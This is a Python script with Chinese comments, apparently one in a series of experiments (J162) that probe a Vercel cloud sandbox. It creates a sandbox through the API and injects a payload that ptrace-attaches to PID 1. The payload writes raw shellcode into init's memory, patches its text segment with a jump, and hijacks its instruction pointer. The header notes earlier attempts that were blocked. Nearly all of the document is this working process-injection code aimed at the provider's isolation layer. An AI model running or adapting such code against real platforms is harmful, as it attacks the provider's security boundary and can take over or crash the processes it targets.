# 实验J162: ptrace 注入框架验证 (sandbox-init 执行 shellcode: mprotect+写pipe)
# j161: ptrace attach/getregs/detach 可用; 直连init.sock被杀; 大读/proc/1/mem被杀
# 方法: 1) 创建pipe dup2到fd100  2) attach 保存regs  3) text段写跳板(mprotect syscall + jmp)
#      4) rw段写shellcode(write pipe + 恢复regs + 跳回原rip)  5) 修改rip 6) cont
# 零破坏: shellcode只写本地pipe, 完成后恢复现场
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=15000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)

NAME = "expj162"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

CA = r'''
import ctypes, time, os, struct, subprocess
out = open("/tmp/d162a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)

libc = ctypes.CDLL(None, use_errno=True)
libc.ptrace.restype = ctypes.c_long
PTRACE_ATTACH, PTRACE_DETACH, PTRACE_CONT = 16, 17, 7
PTRACE_GETREGS, PTRACE_SETREGS = 12, 13
PTRACE_POKEDATA, PTRACE_POKETEXT = 5, 4
PTRACE_PEEKDATA = 2

class UserRegs(ctypes.Structure):
    _fields_ = [("r15", ctypes.c_ulonglong), ("r14", ctypes.c_ulonglong),
                ("r13", ctypes.c_ulonglong), ("r12", ctypes.c_ulonglong),
                ("rbp", ctypes.c_ulonglong), ("rbx", ctypes.c_ulonglong),
                ("r11", ctypes.c_ulonglong), ("r10", ctypes.c_ulonglong),
                ("r9", ctypes.c_ulonglong), ("r8", ctypes.c_ulonglong),
                ("rax", ctypes.c_ulonglong), ("rcx", ctypes.c_ulonglong),
                ("rdx", ctypes.c_ulonglong), ("rsi", ctypes.c_ulonglong),
                ("rdi", ctypes.c_ulonglong), ("orig_rax", ctypes.c_ulonglong),
                ("rip", ctypes.c_ulonglong), ("cs", ctypes.c_ulonglong),
                ("eflags", ctypes.c_ulonglong), ("rsp", ctypes.c_ulonglong),
                ("ss", ctypes.c_ulonglong), ("fs_base", ctypes.c_ulonglong),
                ("gs_base", ctypes.c_ulonglong), ("ds", ctypes.c_ulonglong),
                ("es", ctypes.c_ulonglong), ("fs", ctypes.c_ulonglong),
                ("gs", ctypes.c_ulonglong)]

# 1. 创建 pipe, dup2 写端到 100
rfd, wfd = os.pipe()
os.dup2(wfd, 100)
p("pipe", rfd, wfd, "->100")

# 2. attach
libc.ptrace(PTRACE_ATTACH, 1, 0, 0)
time.sleep(0.3)
regs = UserRegs()
libc.ptrace(PTRACE_GETREGS, 1, 0, ctypes.byref(regs))
orig_rip = regs.rip
orig_sp = regs.rsp
p("orig_rip", hex(orig_rip), "orig_rsp", hex(orig_sp))

# 3. 选 rw 段地址 (0xe9e000, 页对齐) 作为 shellcode 区
SC_ADDR = 0xe9e000
# 4. shellcode: 
#   write(100, "HIJACK_OK\\n", 10) 然后恢复 regs 跳回
#   用间接跳转: 从内存读保存的 regs? 简化: 直接 mov rax=1 write syscall, 然后
#   通过栈上保存的 orig_rip 返回: 我们改栈顶? 不行, rsp 会变。
#   方案: shellcode 保存 rdi/rsi/rdx/rax 到 rw 段, 完成后再恢复并 jmp
#   简化方案: shellcode 末尾直接 jmp 到保存的 rip (绝对地址写死在shellcode里)
sc = b""
sc += b"\x48\xc7\xc0\x01\x00\x00\x00"   # mov rax, 1 (write)
sc += b"\x48\xc7\xc7\x64\x00\x00\x00"   # mov rdi, 100
sc += b"\x48\x8d\x35" + struct.pack("<I", (SC_ADDR + 0x80) & 0xffffffff)  # lea rsi, [rip+...] 简化: 用绝对地址
sc += b"\xba\x0c\x00\x00\x00"           # mov rdx, 12
sc += b"\x0f\x05"                        # syscall
sc += b"\x48\xc7\xc0\x3c\x00\x00\x00"   # mov rax, 60 (exit) -- 危险! 不 exit
sc += b"\xcc"                            # int3 停住 (不再恢复, 测试用)

# 修正: lea 用 rip 相对不行, 直接用绝对地址写 rsi
sc = b""
sc += b"\x48\xc7\xc0\x01\x00\x00\x00"   # mov rax, 1
sc += b"\x48\xc7\xc7\x64\x00\x00\x00"   # mov rdi, 100
sc += b"\x48\xc7\xc6" + struct.pack("<I", (SC_ADDR + 0x200) & 0xffffffff)  # mov rsi, imm32 (0扩展不够, 用48 c7 c6)
sc += b"\xba\x0c\x00\x00\x00"           # mov rdx, 12
sc += b"\x0f\x05"                        # syscall
sc += b"\xcc"                            # int3
MSG_ADDR = SC_ADDR + 0x200
sc += b"\x00" * (0x200 - len(sc))
sc += b"HIJACK_OK!!\x00"  # 12 bytes

p("sc_len", len(sc))
# 写入 rw 段
for i in range(0, len(sc), 8):
    chunk = sc[i:i+8]
    chunk += b"\x00" * (8 - len(chunk))
    val = struct.unpack("<Q", chunk)[0]
    libc.ptrace(PTRACE_POKEDATA, 1, SC_ADDR + i, val)

# 5. text 段跳板: 在 0x401000 前几字节写跳转 (jmp SC_ADDR)
#    但 text 段是文件映射 COW, POKETEXT 应可行
#    jmp rel32: E9 xx xx xx xx  (目标-下一指令)
tramp = 0x401000
jmp_rel = (SC_ADDR - (tramp + 5)) & 0xffffffff
jmp_code = b"\xe9" + struct.pack("<I", jmp_rel)
old = libc.ptrace(PTRACE_PEEKDATA, 1, tramp, 0)
p("old_tramp", hex(old & 0xffffffffffffffff))
val = struct.unpack("<Q", (jmp_code + b"\x90\x90\x90")[:8])[0]
libc.ptrace(PTRACE_POKETEXT, 1, tramp, val)

# 6. 修改 rip 到跳板
regs.rip = tramp
libc.ptrace(PTRACE_SETREGS, 1, 0, ctypes.byref(regs))

# 7. 设置 int3 后的处理: 我们不恢复, 等 int3 后 detach? int3 会让 PID1 停止(SIGTRAP)
# 直接 cont, shellcode 执行到 int3 停止
libc.ptrace(PTRACE_CONT, 1, 0, 0)
time.sleep(1.5)

# 8. 从 pipe 读
os.set_blocking(rfd, False)
time.sleep(0.3)
data = b""
try:
    while True:
        d = os.read(rfd, 4096)
        if not d:
            break
        data += d
except BlockingIOError:
    pass
p("pipe_data", repr(data))

# 9. 清理: 恢复 text 段, detach (PID1 停在 int3)
try:
    libc.ptrace(PTRACE_POKETEXT, 1, tramp, old)
except Exception as e:
    p("restore err", repr(e))
libc.ptrace(PTRACE_DETACH, 1, 0, 0)
p("detached")
p("=== DONE")
out.close()
'''

run_cmd(sid, CA, "inject-test", timeout=200)
catfile(sid, "/tmp/d162a.txt", "d162a", 4000)

# 检查沙箱是否还活着
CB = r'''
import os
out = open("/tmp/d162b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
try:
    p("pid1_alive", os.path.exists("/proc/1"))
    p("cmdline", open("/proc/1/cmdline", "rb").read()[:100])
except Exception as e:
    p("err", repr(e))
p("=== DONE")
out.close()
'''
run_cmd(sid, CB, "alive-check", timeout=100)
catfile(sid, "/tmp/d162b.txt", "d162b", 1000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
